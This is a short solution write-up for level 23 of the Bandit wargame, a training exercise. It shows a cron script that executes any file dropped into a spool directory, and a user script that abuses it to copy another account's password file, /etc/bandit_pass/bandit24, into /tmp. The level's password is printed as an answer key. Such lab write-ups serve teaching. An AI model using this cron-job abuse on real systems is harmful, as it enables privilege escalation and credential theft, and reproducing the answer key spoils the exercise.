# Level 23 Solution

Password:

```txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

Steps:

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

bandit23@bandit:/tmp/temporary12$ vim script.sh
bandit23@bandit:/tmp/temporary12$ cat script.sh 
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/temporary12/pass
bandit23@bandit:/tmp/temporary12$ touch pass
bandit23@bandit:/tmp/temporary12$ chmod 777 script.sh pass
bandit23@bandit:/tmp/temporary12$ ls -la
total 10480
drwxrwxr-x   2 bandit23 bandit23     4096 Jun 29 16:40 .
drwxrwx-wt 316 root     root     10715136 Jun 29 16:40 ..
-rwxrwxrwx   1 bandit23 bandit23        0 Jun 29 16:40 pass
-rwxrwxrwx   1 bandit23 bandit23       67 Jun 29 16:39 script.sh
bandit23@bandit:/tmp/temporary12$ cp script.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/temporary12$ cat pass
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
